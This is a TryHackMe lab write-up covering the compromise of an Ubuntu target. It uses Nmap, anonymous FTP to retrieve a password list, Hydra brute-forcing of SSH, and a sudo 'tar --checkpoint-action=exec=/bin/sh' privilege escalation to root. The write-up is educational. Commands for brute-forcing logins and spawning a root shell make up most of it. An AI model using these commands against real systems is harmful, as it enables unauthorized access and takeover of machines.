# TryHackMe Writeup

## 📌 Room Information

* **Platform:** TryHackMe
* **Target:** 10.113.160.72
* **OS:** Ubuntu 20.04.6 LTS
* **Difficulty:** Easy
* **Techniques:** Enumeration, Anonymous FTP, Password Attacks, SSH, Privilege Escalation

> All testing was performed against an authorized TryHackMe lab environment.

---

# 1. Reconnaissance

I started with an Nmap scan to identify open ports, running services, and their versions.

```bash
nmap -sV -sC 10.113.160.72
```

### Open Ports

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsftpd 3.0.5  |
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 |

The Nmap scan also revealed that **anonymous FTP login was allowed**.

```text
ftp-anon: Anonymous FTP login allowed
```

This was the first interesting attack surface.

---

# 2. Anonymous FTP

I connected to the FTP service using anonymous authentication.

```bash
ftp 10.113.160.72
```

I used:

```text
Username: Anonymous
```

The login was successful.

```text
230 Login successful.
```

Although the initial directory listing returned a permission error, the FTP server allowed the files to be retrieved.

The directory contained:

```text
locks.txt
task.txt
```

I downloaded both files:

```ftp
mget *
```

---

# 3. Information Gathering

I inspected the downloaded files.

```bash
cat task.txt
```

The file contained information referencing a user named `lin`.

I then inspected the password list:

```bash
cat locks.txt
```

The file contained multiple possible passwords.

This suggested that the discovered password list could potentially be tested against the SSH service for the `lin` account.

---

# 4. SSH Credential Testing

I used Hydra against the SSH service with the discovered username and password list.

```bash
hydra ssh://10.113.160.72 -l lin -P locks.txt
```

Hydra identified valid credentials for the `lin` account.

> Credentials are intentionally not published in this writeup.

---

# 5. SSH Access

I used the discovered credentials to connect through SSH.

```bash
ssh lin@10.113.160.72
```

The connection was successful and provided a shell as the `lin` user.

I then inspected the user's Desktop directory:

```bash
ls
```

A `user.txt` file was present.

I retrieved the user flag with:

```bash
cat user.txt
```

The user flag was successfully obtained.

---

# 6. Privilege Escalation Enumeration

After obtaining access as `lin`, I checked which commands the user could execute with elevated privileges.

```bash
sudo -l
```

The output showed that `lin` could execute:

```text
(root) /bin/tar
```

This was significant because `tar` can be abused in certain configurations to execute commands through its checkpoint functionality.

---

# 7. Privilege Escalation

I used the permitted `tar` binary to spawn a shell with root privileges.

```bash
sudo tar cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

I verified the current user:

```bash
whoami
```

Output:

```text
root
```

The privilege escalation was successful.

---

# 8. Root Flag

After obtaining a root shell, I navigated to `/root`:

```bash
cd /root
ls
```

The directory contained:

```text
root.txt
```

I retrieved the root flag:

```bash
cat root.txt
```

The root flag was successfully obtained.

---

# 9. Attack Path Summary

The complete attack chain was:

```text
Nmap
  ↓
Open FTP discovered
  ↓
Anonymous FTP login
  ↓
Downloaded locks.txt and task.txt
  ↓
Discovered username: lin
  ↓
Password list obtained
  ↓
Hydra against SSH
  ↓
SSH access as lin
  ↓
User flag
  ↓
sudo -l
  ↓
/bin/tar allowed as root
  ↓
Tar checkpoint command
  ↓
Root shell
  ↓
Root flag
```

---

# 10. Key Lessons Learned

### Enumeration

Nmap helped identify the available attack surface and running services.

### FTP

Anonymous FTP access can expose files that should not be publicly accessible.

### Credential Security

Exposed password lists can lead to account compromise when weak or reused credentials are present.

### SSH

Once valid credentials were identified, SSH provided authenticated access to the target.

### Privilege Escalation

The `sudo -l` command is an important enumeration step after obtaining a low-privileged shell.

### Sudo Misconfiguration

Allowing a user to execute powerful binaries such as `tar` with root privileges can lead to privilege escalation if the binary's capabilities are not properly restricted.

---

# 🛠️ Tools Used

* Nmap
* FTP
* Hydra
* SSH
* Linux
* sudo
* tar

---

# ⚠️ Disclaimer

This writeup documents activity performed in an authorized TryHackMe lab environment for educational and cybersecurity learning purposes.

Do not use these techniques against systems without explicit authorization.
